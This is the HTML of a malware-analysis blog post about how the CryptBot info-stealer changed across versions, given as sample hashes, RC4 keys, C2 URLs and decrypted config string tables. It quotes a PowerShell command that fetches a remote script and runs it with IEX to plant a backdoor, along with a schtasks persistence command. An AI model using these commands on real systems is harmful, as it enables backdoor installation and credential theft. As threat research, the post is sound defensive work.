@@ -1,0 +1,1262 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CryptBot Evolution | OALABS Research</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="CryptBot Evolution" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Tracking the many iterations of this stealer" />
+<meta property="og:description" content="Tracking the many iterations of this stealer" />
+<link rel="canonical" href="https://research.openanalysis.net/cryptbot/botnet/yara/config/2024/12/06/cryptbot2.html" />
+<meta property="og:url" content="https://research.openanalysis.net/cryptbot/botnet/yara/config/2024/12/06/cryptbot2.html" />
+<meta property="og:site_name" content="OALABS Research" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-06T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CryptBot Evolution" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-06T00:00:00-06:00","datePublished":"2024-12-06T00:00:00-06:00","description":"Tracking the many iterations of this stealer","headline":"CryptBot Evolution","mainEntityOfPage":{"@type":"WebPage","@id":"https://research.openanalysis.net/cryptbot/botnet/yara/config/2024/12/06/cryptbot2.html"},"url":"https://research.openanalysis.net/cryptbot/botnet/yara/config/2024/12/06/cryptbot2.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://research.openanalysis.net/feed.xml" title="OALABS Research" /><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
+
+<script>
+function wrap_img(fn) {
+    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
+        var elements = document.querySelectorAll(".post img");
+        Array.prototype.forEach.call(elements, function(el, i) {
+            if (el.getAttribute("title") && (el.className != "emoji")) {
+                const caption = document.createElement('figcaption');
+                var node = document.createTextNode(el.getAttribute("title"));
+                caption.appendChild(node);
+                const wrapper = document.createElement('figure');
+                wrapper.className = 'image';
+                el.parentNode.insertBefore(wrapper, el);
+                el.parentNode.removeChild(el);
+                wrapper.appendChild(el);
+                wrapper.appendChild(caption);
+            }
+        });
+    } else { document.addEventListener('DOMContentLoaded', fn); }
+}
+window.onload = wrap_img;
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function(){
+    // add link icon to anchor tags
+    var elem = document.querySelectorAll(".anchor-link")
+    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
+    });
+</script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">OALABS Research</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/categories/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">CryptBot Evolution</h1><p class="page-description">Tracking the many iterations of this stealer</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2024-12-06T00:00:00-06:00" itemprop="datePublished">
+        Dec 6, 2024
+      </time>
+       • <span class="read-time" title="Estimated read time">
+    
+    
+      7 min read
+    
+</span></p>
+
+    
+      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
+      
+        <a class="category-tags-link" href="/categories/#cryptbot">cryptbot</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#botnet">botnet</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#yara">yara</a>
+        &nbsp;
+      
+        <a class="category-tags-link" href="/categories/#config">config</a>
+        
+      
+      </p>
+    
+
+    
+      
+        <div class="pb-5 d-flex flex-justify-left">
+            <div class="px-2">
+                <a href="https://www.youtube.com/c/OALabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-YouTube-FF0000" alt="Join us on YouTube">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.twitch.tv/oalabslive" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/twitch/status/oalabslive?style=social" alt="Join us on Twitch">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://discord.gg/cw4U3WHvpn" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-Join Our Discord-blueviolet" alt="Join Discord">
+                </a>
+            </div>
+            <div class="px-2">
+                <a href="https://www.patreon.com/oalabs" role="button" target="_blank">
+                    <img class="notebook-badge-image" src="https://img.shields.io/badge/-OALABS Patreon-FF424D" alt="Support us on Patreon">
+                </a>
+            </div>
+          <div class="px-2">
+
+    <a href="https://github.com/OALabs/research/tree/master/_notebooks/2024-12-06-cryptbot2.ipynb" role="button" target="_blank">
+<img class="notebook-badge-image" src="/assets/badges/github.svg" alt="View On GitHub">
+    </a>
+</div>
+
+          
+          
+          
+        </div>
+      </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h2"><a href="#Overview">Overview </a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#References">References </a></li>
+<li class="toc-entry toc-h3"><a href="#Version-1-(November-2023)">Version 1 (November 2023) </a></li>
+<li class="toc-entry toc-h3"><a href="#Version-2-(Timeline-unknown)">Version 2 (Timeline unknown) </a></li>
+<li class="toc-entry toc-h3"><a href="#Version-3.1-(Timeline-unknown)">Version 3.1 (Timeline unknown) </a></li>
+<li class="toc-entry toc-h3"><a href="#Version-3.2-(Timeline-unknown)">Version 3.2 (Timeline unknown) </a></li>
+</ul>
+</li>
+</ul><!--
+#################################################
+### THIS FILE WAS AUTOGENERATED! DO NOT EDIT! ###
+#################################################
+# file to edit: _notebooks/2024-12-06-cryptbot2.ipynb
+-->
+
+<div class="container" id="notebook-container">
+        
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Overview">
+<a class="anchor" href="#Overview" aria-hidden="true"><span class="octicon octicon-link"></span></a>Overview<a class="anchor-link" href="#Overview"> </a>
+</h2>
+<p>CryptBot has evolved significantly over the past two years. Starting out as a simple stealer compiled with msvc and and containing an XOR encrypted config, the developers have released multiple iterations of the bot attempting to distence themselves from the orignal stealer. The modern version is almost unrecognizable, it is compiled with minGw, makes heavy use of an obfuscator, and uses RC4 to protect its configuration, however, once the layers are stripped away, this is still the same simple stealer underneath.</p>
+<h3 id="References">
+<a class="anchor" href="#References" aria-hidden="true"><span class="octicon octicon-link"></span></a>References<a class="anchor-link" href="#References"> </a>
+</h3>
+<ul>
+<li><a href="https://intezer.com/blog/research/cryptbot-yet-another-silly-stealer-yass/">There's Something About CryptBot: Yet Another Silly Stealer (YASS)</a></li>
+</ul>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Version-1-(November-2023)">
+<a class="anchor" href="#Version-1-(November-2023)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Version 1 (November 2023)<a class="anchor-link" href="#Version-1-(November-2023)"> </a>
+</h3>
+<ul>
+<li><a href="https://research.openanalysis.net/cryptbot/botnet/yara/config/2023/03/16/cryptbot.html">OALABS CryptBot V1 Analysis</a></li>
+<li>Config encrypted with xor</li>
+<li>msvc compiled</li>
+<li>Packed <code>7ccda59528c0151bc9f11b7f25f8291d99bcf541488c009ef14e2a104e6f0c5d</code>
+</li>
+<li>Unpacked <code>cfbecf45c083efffff6d3000972a66cddb2f26d5c1845a697351b132e65049e0</code>
+</li>
+</ul>
+<p>Plaintext strings in binary used for C2 comms.</p>
+
+<pre><code>UID:
+UserName:
+ComputerName:
+DateTime:
+UserAgent:
+Keyboard Languages:
+Display Resolution:
+CPU:
+RAM:
+GPU:
+isGodMod: yes
+isGodMod: no
+isAdmin: yes
+isAdmin: no
+Installed software:</code></pre>
+<p>Config</p>
+
+<pre><code>ExternalDownload: http://ovapfa05.top/unfele.dat
+C2: http://erniku42.top/gate.php;</code></pre>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Version-2-(Timeline-unknown)">
+<a class="anchor" href="#Version-2-(Timeline-unknown)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Version 2 (Timeline unknown)<a class="anchor-link" href="#Version-2-(Timeline-unknown)"> </a>
+</h3>
+<ul>
+<li>Config encrypted with rc4.</li>
+<li>msvc compiled</li>
+<li>Not packed <code>34dcc780d2a2357c52019d87a0720802a92f358d15320247c80cc21060fb6f57</code>
+</li>
+<li>rc4 key <code>oSabnN</code>
+</li>
+</ul>
+<p>According to <a href="https://intezer.com/blog/research/cryptbot-yet-another-silly-stealer-yass/">Intezer</a></p>
+<blockquote>
+<p>The stealer also has the ability to drop the <strong>NetSupport</strong> Client as a backdoor for the infected machine. The client is deployed via a PowerShell command and script.</p>
+
+<pre><code>/c powershell -NoP -NonI -ExecutionPolicy Bypass -Command "$Resp = Invoke-WebRequest -Uri 'https://brewdogebar[.]com/code.vue' -UseBasicParsing -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'; $Scr = [System.Text.Encoding]::UTF8.GetString($Resp.Content); IEX $Scr"</code></pre>
+</blockquote>
+<p>Plaintext strings in binary used for C2 comms.</p>
+
+<pre><code>UserName (ComputerName):
+Data (Time): 
+OS: 
+Keyboard Languages: 
+CPU: 
+RAM:
+GPU: 
+Display Resolution: 
+Installed Apps:</code></pre>
+<p>Decrypted config (ascii and wide version of the same table)</p>
+
+<pre><code>gceight8vt.top
+\Winodukec
+oSabnN
+\ServiceData
+\ServiceData\Clip.jpg
+\ServiceData\Clip.exe
+/c schtasks /create /tn \Service\Data /tr """"%wS""" """%wS"""" /st 00:01 /du 9800:59 /sc once /ri 1 /f
+GET
+POST
+/index.php
+/gate.php
+/zip.php
+/upload.php
+curl/8.0.1
+NULL
+NULL
+NULL
+Content-Length: %lu
+HTTP
+HTTPS
+"encrypted_key":"
+DPAPI
+DISPLAY
+$CREEN.JPEG
+ScreenShot.jpeg
+Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+Apps
+Browsers
+Files
+Wallets
+UserID.txt
+Debug.txt
+End.txt
+log.txt
+User's Computer Information.txt
+Desktop
+Others
+NULL
+An error occurred while starting the application (0xc000007b). To exit the application, click OK.
+System Error
+NULL
+ComSpec
+LocalAppData
+AppData
+Temp
+UserProfile
+NULL
+NULL
+shaverma.site
+NULL
+kernel32.dll
+ntdll.dll
+user32.dll
+shlwapi.dll
+msvcrt.dll
+shell32.dll
+wininet.dll
+winhttp.dll
+ws2_32.dll
+urlmon.dll
+crypt32.dll
+gdi32.dll
+gdiplus.dll
+ole32.dll
+cabinet.dll
+advpack.dll
+advapi32.dll
+rstrtmgr.dll
+winsqlite3.dll
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+GetModuleHandleA
+GetModuleHandleW
+GetModuleHandleExA
+GetModuleHandleExW
+LoadLibraryA
+LoadLibraryW
+LoadLibraryExA
+LoadLibraryExW
+GetProcAddress
+FreeLibrary
+NULL
+MessageBoxA
+MessageBoxW
+NULL
+CreateThread
+CreateRemoteThread
+CreateRemoteThreadEx
+OpenThread
+OpenProcess
+GetThreadId
+GetProcessId
+CreateMutexA
+CreateMutexW
+ReleaseMutex
+WaitForSingleObject
+CreateProcessA
+CreateProcessW
+ShellExecuteA
+ShellExecuteW
+WinExec
+NULL
+HeapCreate
+GetProcessHeap
+HeapAlloc
+HeapReAlloc
+HeapSize
+HeapFree
+NULL
+VirtualAlloc
+VirtualAllocEx
+VirtualFree
+VirtualFreeEx
+VirtualProtect
+VirtualProtectEx
+NULL
+LocalAlloc
+LocalFree
+NULL
+calloc
+malloc
+realloc
+free
+NULL
+CreateFileA
+CreateFileW
+ReadFile
+WriteFile
+SetFilePointer
+SetFilePointerEx
+GetFileAttributesA
+GetFileAttributesW
+GetFileAttributesExA
+GetFileAttributesExW
+GetFileSize
+GetFileSizeEx
+CreateFileMappingA
+CreateFileMappingW
+MapViewOfFile
+UnmapViewOfFile
+CloseHandle
+NULL
+SHGetFolderPathA
+SHGetFolderPathW
+GetEnvironmentVariableA
+GetEnvironmentVariableW
+ExpandEnvironmentStringsA
+ExpandEnvironmentStringsW
+GetModuleFileNameA
+GetModuleFileNameW
+GetModuleFileNameExA
+GetModuleFileNameExW
+GetCurrentDirectoryA
+GetCurrentDirectoryW
+GetSystemDirectoryA
+GetSystemDirectoryW
+GetSystemWow64DirectoryA
+GetSystemWow64DirectoryW
+GetTempPathA
+GetTempPathW
+GetTempFileNameA
+GetTempFileNameW
+NULL
+URLDownloadToFileA
+URLDownloadToFileW
+URLOpenBlockingStreamA
+URLOpenBlockingStreamW
+CoInitialize
+CoUninitialize
+NULL
+WinHttpCrackUrl
+WinHttpOpen
+WinHttpConnect
+WinHttpOpenRequest
+WinHttpAddRequestHeaders
+WinHttpSendRequest
+WinHttpReceiveResponse
+WinHttpReadData
+WinHttpReadDataEx
+WinHttpQueryHeaders
+WinHttpQueryOption
+WinHttpCloseHandle
+NULL
+InternetCrackUrlA
+InternetOpenUrlA
+InternetOpenA
+InternetConnectA
+HttpOpenRequestA
+HttpSendRequestA
+HttpQueryInfoA
+InternetReadFile
+InternetReadFileExA
+InternetCloseHandle
+NULL
+InternetCrackUrlW
+InternetOpenUrlW
+InternetOpenW
+InternetConnectW
+HttpOpenRequestW
+HttpSendRequestW
+HttpQueryInfoW
+InternetReadFile
+InternetReadFileExW
+InternetCloseHandle
+NULL
+WSAStartup
+socket
+htons
+inet_addr
+bind
+listen
+accept
+recv
+recvfrom
+send
+closesocket
+WSAGetLastError
+WSACleanup
+NULL
+FindFirstFileNameA
+FindFirstFileNameW
+FindNextFileNameA
+FindNextFileNameW
+FindFirstFileA
+FindFirstFileW
+FindFirstFileExA
+FindFirstFileExW
+FindNextFileA
+FindNextFileW
+FindClose
+NULL
+RegOpenKeyExA
+RegOpenKeyExW
+RegQueryInfoKeyA
+RegQueryInfoKeyW
+RegEnumKeyExA
+RegEnumKeyExW
+RegQueryValueExA
+RegQueryValueExW
+RegCloseKey
+NULL
+wnsprintfA
+wnsprintfW
+StrStrIA
+StrStrIW
+PathIsDirectoryA
+PathIsDirectoryW
+PathFileExistsA
+PathFileExistsW
+SHAnsiToUnicode
+SHUnicodeToAnsi
+NULL
+wsprintfA
+wsprintfW
+_snprintf
+_snwprintf
+swprintf
+sprintf
+_swprintf
+sprintf_s
+swprintf_s
+_snwprintf_s
+_vscprintf
+vsnprintf
+_vscwprintf
+vswprintf
+NULL
+WideCharToMultiByte
+MultiByteToWideChar
+GetComputerNameA
+GetComputerNameW
+GetUserNameA
+GetUserNameW
+CopyFileA
+CopyFileW
+CopyFileExA
+CopyFileExW
+DeleteFileA
+DeleteFileW
+MoveFileA
+MoveFileW
+MoveFileExA
+MoveFileExW
+CreateDirectoryA
+CreateDirectoryW
+RemoveDirectoryA
+RemoveDirectoryW
+NULL
+EnumDisplaySettingsA
+EnumDisplaySettingsW
+CreateDCA
+CreateDCW
+CreateCompatibleDC
+CreateCompatibleBitmap
+SelectObject
+BitBlt
+GetDeviceCaps
+StretchBlt
+GetObjectA
+GetObjectW
+GetDIBits
+ReleaseDC
+DeleteDC
+NULL
+GdiplusStartup
+GdipGetImageEncoders
+GdipGetImageEncodersSize
+GdipLoadImageFromFile
+GdipCreateBitmapFromHBITMAP
+GdipSaveImageToFile
+GdipSaveImageToStream
+GetBitmapBits
+DeleteObject
+GdiplusShutdown
+NULL
+SHCreateMemStream
+CreateStreamOnHGlobal
+SaveImageToStream
+IStream_Size
+IStream_Reset
+IStream_Read
+NULL
+ExtractFilesA
+ExtractFilesW
+Extract
+FCICreate
+FCIAddFile
+FCIFlushFolder
+FCIFlushCabinet
+FCIDestroy
+NULL
+CryptUnprotectData
+GetTickCount
+GetTickCount64
+QueryPerformanceCounter
+CreateToolhelp32Snapshot
+Process32FirstA
+Process32FirstW
+Process32NextA
+Process32NextW
+GetLocaleInfoA
+GetLocaleInfoW
+GetLogicalDriveStringsA
+GetLogicalDriveStringsW
+GetDriveTypeA
+GetDriveTypeW
+GetVolumeInformationA
+GetVolumeInformationW
+GetDiskFreeSpaceExA
+GetDiskFreeSpaceExW
+ReadConsoleA
+ReadConsoleW
+WriteConsoleA
+WriteConsoleW
+GetCommandLineA
+GetCommandLineW
+GetConsoleMode
+printf
+wprintf
+atoi
+_wtoi
+FileTimeToSystemTime
+GetFileInformationByHandle
+IsBadReadPtr
+SystemTimeToFileTime
+GetTimeZoneInformation
+GetLocalTime
+GlobalMemoryStatusEx
+DuplicateHandle
+GetCurrentProcess
+GetCurrentThread
+GetUserDefaultLocaleName
+GetSystemMetrics
+GetSystemInfo
+GetNativeSystemInfo
+IsWow64Process
+IsWow64Process2
+GetKeyboardLayoutList
+RtlGetVersion
+GetLastError
+SetErrorMode
+abs
+clock
+OpenProcess
+TerminateProcess
+RmStartSession
+RmRegisterResources
+RmGetList
+RmEndSession
+strtod
+isspace
+Sleep
+SleepEx
+GetExitCodeThread
+ExitThread
+ExitProcess
+FileTimeToDosDateTime
+WinHttpSetOption
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL</code></pre>
+
+</div>
+</div>
+</div>
+<div class="cell border-box-sizing text_cell rendered">
+<div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Version-3.1-(Timeline-unknown)">
+<a class="anchor" href="#Version-3.1-(Timeline-unknown)" aria-hidden="true"><span class="octicon octicon-link"></span></a>Version 3.1 (Timeline unknown)<a class="anchor-link" href="#Version-3.1-(Timeline-unknown)"> </a>
+</h3>
+<ul>
+<li>Config encrypted with rc4 (dynamic)</li>
+<li>gcc compiled Linker: GNU linker ld (GNU Binutils)(2.40)GUI32</li>
+<li>contains a zipped binary and dll</li>
+<li><code>ff10143803f39c6c08b2fbe846d990b92c6d1b71e27f89bca69ab9331945b14a</code></li>
+<li>rc4 key <code>LkgwUi</code>
+</li>
+<li>contains embeded clipboard crypto stealer</li>
+<li>complete crypto stealer <code>059d39e5ea384d50c448696da393e9396b883627e5ad02bdd77b66371ba34f7d</code>
+</li>
+<li>corrupted crypto stealer <code>7a5a330e626f73b5c4bfa9aeb29a19429cbdd66dd7968b190586c14cbee8a7c9</code>
+</li>
+</ul>
+<p>Crypto addresses</p>
+
+<pre><code>0xAd32513c4eC05473BD61E6B52eDfd9b6E1Aa5cb8
+addr1q8jpzpnwlwu4a6kjyjxgvezzm37u9t84fz959e0fzyxm2s0yzyrxa7aetm4dyfyvsejy9hrac2k02jytgtj7jygdk4qs3eg0ge
+bc1qyyuf4jnjl0h0cak8x6jr2j4tg8kdqtvpmuy4ry
+17f9LD7vcwLAQCKLndeSw4mHog4TMYiQUR
+3KqeRSDxs4TcK9B2DiymiH43ecc7wYwyNW
+1XFCPNp73Ri94yuzn1Uw7UuBjc
+LZXNaN8NvdGLzCS5CxRRELkam3CPENdJnb
+TDkA9uBQPpstFPZEwh4avMdea5Himx2a7T
+rsUa6Xs5fiqvp6EHV4urFE8Sk7QHHVwWez
+terra1xkkzmqhgzlezxdn2qserytms7ng3zxcw8639yx
+KPET9oKko2NGKgzojp7AcAreukPDoNZifHMSDsVjQGt</code></pre>
+<p>"Anal" build artifacts that dox the build env</p>
+
+<pre><code>/home/anal/bot/zip_include/zip.c
+/home/anal/bot/zip_include/miniz.h</code></pre>
+<p>C2
+<code>http://tventyvx20pn.top/v1/upload.php</code></p>
+<p>Plaintext stirngs in binary for c2</p>
+
+<pre><code>CPU:                       
+RAM:                       
+Installed Apps:
+Display Resolution:        
+GPU:                       
+OS:                        
+UserName (ComputerName):   
+Keyboard Languages:        
+Data (Time):</code></pre>
+<p>Decrypted config strings</p>
+
+<pre><code>tventyvx20pn.top
+\nuSONyiIRP
+LkgwUi
+\ServiceData
+\ServiceData\Clip.au3
+\ServiceData\Clip.exe
+/c schtasks /create /tn \Service\Data /tr """"%wS""" """%wS"""" /st 00:01 /du 9800:59 /sc once /ri 1 /f
+GET
+POST
+/index.php
+/gate.php
+/zip.php
+/v1/upload.php
+curl/8.0.1
+NULL
+NULL
+NULL
+Content-Length: %lu
+HTTP
+HTTPS
+"encrypted_key":"
+DPAPI
+DISPLAY
+$CREEN.JPEG
+ScreenShot.jpeg
+Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+Apps
+Browsers
+Files
+Wallets
+UserID.txt
+Debug.txt
+End.txt
+log.txt
+User's Computer Information.txt
+Desktop
+Others
+NULL
+An error occurred while starting the application (0xc000007b). To exit the application, click OK.
+System Error
+NULL
+ComSpec
+LocalAppData
+AppData
+Temp
+UserProfile
+NULL
+NULL
+analforeverlovyu.top
+NULL
+kernel32.dll
+ntdll.dll
+user32.dll
+shlwapi.dll
+msvcrt.dll
+shell32.dll
+wininet.dll
+winhttp.dll
+ws2_32.dll
+urlmon.dll
+crypt32.dll
+gdi32.dll
+gdiplus.dll
+ole32.dll
+cabinet.dll
+advpack.dll
+advapi32.dll
+rstrtmgr.dll
+winsqlite3.dll
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+NULL
+GetModuleHandleA
+GetModuleHandleW
+GetModuleHandleExA
+GetModuleHandleExW
+LoadLibraryA
+LoadLibraryW
+LoadLibraryExA
+LoadLibraryExW
+GetProcAddress
+FreeLibrary
+NULL
+MessageBoxA
+MessageBoxW
+NULL
+CreateThread
+CreateRemoteThread
+CreateRemoteThreadEx
+OpenThread
+OpenProcess
+GetThreadId
+GetProcessId
+CreateMutexA
+CreateMutexW
+ReleaseMutex
+WaitForSingleObject
+CreateProcessA
+CreateProcessW
+ShellExecuteA
+ShellExecuteW
+WinExec
+NULL
+HeapCreate
+GetProcessHeap
+HeapAlloc
+HeapReAlloc
+HeapSize
+HeapFree
+NULL
+VirtualAlloc
+VirtualAllocEx
+VirtualFree
+VirtualFreeEx
+VirtualProtect
+VirtualProtectEx
+NULL
+LocalAlloc
+LocalFree
+NULL
+calloc
+malloc
+realloc
+free
+NULL
+CreateFileA
+CreateFileW
+ReadFile
+WriteFile
+SetFilePointer
+SetFilePointerEx
+GetFileAttributesA
+GetFileAttributesW
+GetFileAttributesExA
+GetFileAttributesExW
+GetFileSize
+GetFileSizeEx
+CreateFileMappingA
+CreateFileMappingW
+MapViewOfFile
+UnmapViewOfFile
+CloseHandle
+NULL
+SHGetFolderPathA
+SHGetFolderPathW
+GetEnvironmentVariableA
+GetEnvironmentVariableW
+ExpandEnvironmentStringsA
+ExpandEnvironmentStringsW
+GetModuleFileNameA
+GetModuleFileNameW
+GetModuleFileNameExA
+GetModuleFileNameExW
+GetCurrentDirectoryA
+GetCurrentDirectoryW
+GetSystemDirectoryA
+GetSystemDirectoryW
+GetSystemWow64DirectoryA
+GetSystemWow64DirectoryW
+GetTempPathA
+GetTempPathW
+GetTempFileNameA
+GetTempFileNameW
+NULL
+URLDownloadToFileA
+URLDownloadToFileW
+URLOpenBlockingStreamA
+URLOpenBlockingStreamW
+CoInitialize
+CoUninitialize
+NULL
+WinHttpCrackUrl
+WinHttpOpen
+WinHttpConnect
+WinHttpOpenRequest
+WinHttpAddRequestHeaders
+WinHttpSendRequest
+WinHttpReceiveResponse
+WinHttpReadData
+WinHttpReadDataEx
+WinHttpQueryHeaders
+WinHttpQueryOption
+WinHttpCloseHandle
+NULL
+InternetCrackUrlA
+InternetOpenUrlA
+InternetOpenA
+InternetConnectA
+HttpOpenRequestA
+HttpSendRequestA
+HttpQueryInfoA
+InternetReadFile
+InternetReadFileExA
+InternetCloseHandle
+NULL
+InternetCrackUrlW
+InternetOpenUrlW
+InternetOpenW
+InternetConnectW
+HttpOpenRequestW
+HttpSendRequestW
+HttpQueryInfoW
+InternetReadFile
+InternetReadFileExW
+InternetCloseHandle
+NULL
+WSAStartup
+socket
+htons
+inet_addr
+bind
+listen
+accept
+recv
+recvfrom
+send
+closesocket
+WSAGetLastError
+WSACleanup
+NULL
+FindFirstFileNameA
+FindFirstFileNameW
+FindNextFileNameA
+FindNextFileNameW
+FindFirstFileA
+FindFirstFileW
+FindFirstFileExA
+FindFirstFileExW
+FindNextFileA
+FindNextFileW
+FindClose
+NULL
+RegOpenKeyExA
+RegOpenKeyExW
+RegQueryInfoKeyA
+RegQueryInfoKeyW
+RegEnumKeyExA
+RegEnumKeyExW
+RegQueryValueExA
+RegQueryValueExW
+RegCloseKey
+NULL
+wnsprintfA
+wnsprintfW
+StrStrIA
+StrStrIW
+PathIsDirectoryA
+PathIsDirectoryW
+PathFileExistsA
+PathFileExistsW
+SHAnsiToUnicode
+SHUnicodeToAnsi
+NULL
+wsprintfA
+wsprintfW
+_snprintf
+_snwprintf
+swprintf
+sprintf
+_swprintf
+sprintf_s
+swprintf_s
+_snwprintf_s
+_vscprintf
+vsnprintf
+_vscwprintf
+vswprintf
+NULL
+WideCharToMultiByte
+MultiByteToWideChar
+GetComputerNameA
+GetComputerNameW
+GetUserNameA
+GetUserNameW
+CopyFileA
+CopyFileW
+CopyFileExA
+CopyFileExW
+DeleteFileA
+DeleteFileW
+MoveFileA
+MoveFileW
+MoveFileExA
+MoveFileExW
+CreateDirectoryA
+CreateDirectoryW
+RemoveDirectoryA
+RemoveDirectoryW
+NULL
+EnumDisplaySettingsA
+EnumDisplaySettingsW
+CreateDCA
+CreateDCW
+CreateCompatibleDC
+CreateCompatibleBitmap
+SelectObject
+BitBlt
+GetDeviceCaps
+StretchBlt
+GetObjectA
+GetObjectW
+GetDIBits
+ReleaseDC
+DeleteDC
+NULL
+GdiplusStartup
+GdipGetImageEncoders
+GdipGetImageEncodersSize
+GdipLoadImageFromFile
+GdipCreateBitmapFromHBITMAP
+GdipSaveImageToFile
+GdipSaveImageToStream
+GetBitmapBits
+DeleteObject
+GdiplusShutdown
+NULL
+SHCreateMemStream
+CreateStreamOnHGlobal
+SaveImageToStream
+IStream_Size
+IStream_Reset
+IStream_Read
+NULL
+ExtractFilesA
+ExtractFilesW
+Extract
+FCICreate
+FCIAddFile
+FCIFlushFolder
+FCIFlushCabinet
+FCIDestroy
+NULL
+CryptUnprotectData
+GetTickCount
+GetTickCount64
+QueryPerformanceCounter
+CreateToolhelp32Snapshot
+Process32FirstA
+Process32FirstW
+Process32NextA
+Process32NextW
+GetLocaleInfoA
+GetLocaleInfoW
+GetLogicalDriveStringsA
+GetLogicalDriveStringsW
+GetDriveTypeA
+GetDriveTypeW
+GetVolumeInformationA
+GetVolumeInformationW
+GetDiskFreeSpaceExA
+GetDiskFreeSpaceExW
+ReadConsoleA
+ReadConsoleW
+WriteConsoleA
+WriteConsoleW
+GetCommandLineA
+GetCommandLineW
+GetConsoleMode
+printf
+wprintf
+atoi
+_wtoi
+FileTimeToSystemTime
+GetFileInformationByHandle
+IsBadReadPtr
+SystemTimeToFileTime
+GetTimeZoneInformation
+GetLocalTime
+GlobalMemoryStatusEx
+DuplicateHandle
